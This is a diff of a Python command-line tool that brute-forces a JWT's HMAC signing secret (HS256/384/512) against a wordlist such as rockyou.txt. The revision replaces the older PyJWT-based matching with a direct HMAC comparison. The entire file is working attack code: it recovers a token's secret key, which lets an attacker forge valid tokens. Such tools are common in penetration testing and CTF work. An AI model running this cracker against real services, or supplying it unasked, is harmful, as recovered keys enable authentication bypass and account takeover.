@@ -1,92 +1,74 @@
 import sys
 import json
-import jwt
 import argparse
 import os
+import hmac
+import hashlib
 from base64 import urlsafe_b64decode
 
+ALG_HASHES = {
+    "HS256": hashlib.sha256,
+    "HS384": hashlib.sha384,
+    "HS512": hashlib.sha512,
+}
+
 def usage():
-    menu = f"""
-        usage: python3 {sys.argv[0]} [ARGUMENTS]
+    print(f"""
+        usage: python3 {sys.argv[0]} --token=<JWT> --wordlist=<path>
+        example: python3 {sys.argv[0]} --token=eyJ... --wordlist=rockyou.txt
+    """)
 
-        example: python3 {sys.argv[0]} --token=abc123 --wordlist=/path/to/wordlist.txt
-
-
-        ARGUMENTS:
-            --token                 YOUR JWT TOKEN
-            --wordlist              WORDLIST
-    """
-    print(menu)
-
-def verify_path(w):
-    if os.path.isfile(w):
-        return True
-    return False
-
-def validate_token_form(t):
-    try:
-        jwt.get_unverified_header(token)
-        jwt.decode
+def b64url_decode(data):
+    # JWT is base64url with no padding; add it back before decoding
+    padding = "=" * (-len(data) % 4)
+    return urlsafe_b64decode(data + padding)
 
 def decode_token(t):
-    headerb64, payloadb64, signatureb64 = t.split(".")
+    try:
+        headerb64, payloadb64, signatureb64 = t.split(".")
+    except ValueError:
+        sys.exit("[!] Malformed token: expected 3 dot-separated parts")
 
-    header = json.loads(urlsafe_b64decode(header))
-    payload = json.loads(urlsafe_b64decode(payload))
-    signature = urlsafe_b64decode(signature)
-
-    return ((header, payload, signature), (headerb64, payloadb64, signatureb64))
+    header = json.loads(b64url_decode(headerb64))
+    signature = b64url_decode(signatureb64)
+    signing_input = f"{headerb64}.{payloadb64}".encode()  # the exact bytes that were signed
+    return header, signing_input, signature
 
 def validate_alg(alg):
-    if alg.upper() in ["HS256", "HS384", "HS512"]:
-        return True
-    return False
+    return alg.upper() in ALG_HASHES
 
-def validate_match(candidate, token, payload, alg):
-    candidate_token = jwt.encode(payload, candidate, algorithm=alg)
-    if candidate_token == token:
-        return True
-    else:
-        return False
+def validate_match(candidate, signing_input, signature, alg):
+    expected = hmac.new(candidate.encode(), signing_input, ALG_HASHES[alg.upper()]).digest()
+    return hmac.compare_digest(expected, signature)
 
 def brute_force(t, w):
-    decoded_parts, encoded_parts = decode_token(t)
-    header, payload, signature = decoded_parts
+    header, signing_input, signature = decode_token(t)
 
-    alg = header["alg"]
+    alg = header.get("alg", "")
     if not validate_alg(alg):
-        usage()
-        sys.exit(f"[!] Algorithm not valid: {alg}")
+        sys.exit(f"[!] Unsupported or non-HMAC algorithm: {alg!r}")
 
-    # atp: valid wordlist + valid alg
-    with open(w, "r") as f:
+    with open(w, "r", encoding="utf-8", errors="ignore") as f:
         for line in f:
-            candidate = line.rstrip("\n")
-            if validate_match(candidate, t, payload, alg):
+            candidate = line.rstrip("\r\n")
+            if validate_match(candidate, signing_input, signature, alg):
                 print(f"[+] Key found: {candidate}")
-                break
-            
+                return
+    print("[-] Key not found in wordlist")
 
 def main():
-    if len(sys.argv) < 3:
-        usage()
-        sys.exit(1)
-
     parser = argparse.ArgumentParser()
-    parser.add_argument("--token", required=True, help="Token value")
+    parser.add_argument("--token", required=True, help="JWT token")
     parser.add_argument("--wordlist", required=True, help="Path to wordlist")
     args = parser.parse_args()
-    print(f"[+] Token: {args.token}")
-    print(f"[+] Path: {args.wordlist}")
 
-    if not verify_path(args.wordlist):
+    print(f"[+] Token:    {args.token}")
+    print(f"[+] Wordlist: {args.wordlist}")
+
+    if not os.path.isfile(args.wordlist):
         sys.exit(f"[!] Wordlist not found: {args.wordlist}")
 
-    
-
-    # now we must find the key that produces
     brute_force(args.token, args.wordlist)
-
 
 if __name__ == "__main__":
     main()
